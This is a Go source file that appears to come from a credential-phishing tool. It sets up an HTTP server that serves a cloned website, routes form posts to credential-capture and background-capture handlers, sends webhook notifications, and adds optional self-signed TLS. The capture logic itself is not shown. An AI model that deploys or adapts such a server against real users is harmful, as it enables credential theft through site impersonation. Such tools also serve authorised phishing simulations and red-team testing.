package server

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/BLTSEC/caddyshack/internal/config"
	tlsgen "github.com/BLTSEC/caddyshack/internal/tls"
	"github.com/BLTSEC/caddyshack/internal/logger"
	"github.com/BLTSEC/caddyshack/internal/webhook"
)

// Server wraps http.Server with graceful shutdown.
type Server struct {
	cfg      *config.Config
	log      *logger.Logger
	notifier *webhook.Notifier
}

// New constructs a Server.
func New(cfg *config.Config, log *logger.Logger, notifier *webhook.Notifier) *Server {
	return &Server{cfg: cfg, log: log, notifier: notifier}
}

// Start configures routes, binds the listener, and serves until ctx is cancelled.
func (s *Server) Start(ctx context.Context) error {
	h := &handlers{
		cloneDir:    s.cfg.CloneDir,
		log:         s.log,
		redirectURL: s.cfg.RedirectURL,
		notifier:    s.notifier,
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/submit", h.CaptureCredentials)
	mux.HandleFunc("/capture", h.CaptureBackground)
	mux.HandleFunc("/", h.ServeClone)

	srv := &http.Server{
		Addr:         fmt.Sprintf(":%d", s.cfg.Port),
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	scheme := "http"
	if s.cfg.EnableTLS {
		scheme = "https"
		tlsCfg, err := s.buildTLSConfig()
		if err != nil {
			return fmt.Errorf("TLS setup: %w", err)
		}
		srv.TLSConfig = tlsCfg
	}

	ln, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		return fmt.Errorf("listen on %s: %w", srv.Addr, err)
	}

	fmt.Printf("[*] Listening on %s://localhost:%d\n", scheme, s.cfg.Port)

	errCh := make(chan error, 1)
	go func() {
		if s.cfg.EnableTLS {
			errCh <- srv.ServeTLS(ln, "", "")
		} else {
			errCh <- srv.Serve(ln)
		}
	}()

	select {
	case <-ctx.Done():
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return srv.Shutdown(shutCtx)
	case err := <-errCh:
		if err != nil && err != http.ErrServerClosed {
			return err
		}
		return nil
	}
}

func (s *Server) buildTLSConfig() (*tls.Config, error) {
	if s.cfg.CertFile != "" && s.cfg.KeyFile != "" {
		cert, err := tls.LoadX509KeyPair(s.cfg.CertFile, s.cfg.KeyFile)
		if err != nil {
			return nil, err
		}
		return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
	}
	cert, err := tlsgen.Generate()
	if err != nil {
		return nil, fmt.Errorf("generate self-signed cert: %w", err)
	}
	fmt.Println("[*] Using auto-generated self-signed certificate (valid 24h)")
	return &tls.Config{Certificates: []tls.Certificate{*cert}}, nil
}
